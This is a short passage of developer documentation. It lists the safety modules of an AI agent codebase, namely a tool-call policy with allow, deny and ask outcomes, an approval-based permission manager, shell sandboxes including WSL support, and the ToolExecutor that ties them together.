- **`agent/safety/policy.py`** — `SafetyPolicy` evaluates tool calls against `PolicyConfig` rules, returning ALLOW/DENY/ASK
- **`agent/safety/permissions.py`** — `PermissionManager` handles ASK decisions by calling the approval callback and caching APPROVED_ALWAYS results
- **`agent/safety/sandbox.py`** — `LocalSandbox`, `LinuxSandbox`, `WindowsSubprocessSandbox`, and `WslDistroSandbox` control how shell commands are actually executed
- **`agent/safety/wsl_manager.py`** — helpers for WSL2 distro lifecycle (`is_wsl_available`, `list_distros`, `import_distro`, `unregister_distro`, `run_in_distro`, `download_rootfs`); used by `aar sandbox` commands
- **`agent/tools/builtin/shell.py`** — the `bash` tool handler delegates to the configured sandbox via a closure injected at registration time

These are composed by `ToolExecutor` (`agent/tools/execution.py`), which is the single entry point for all tool execution in the agent loop.
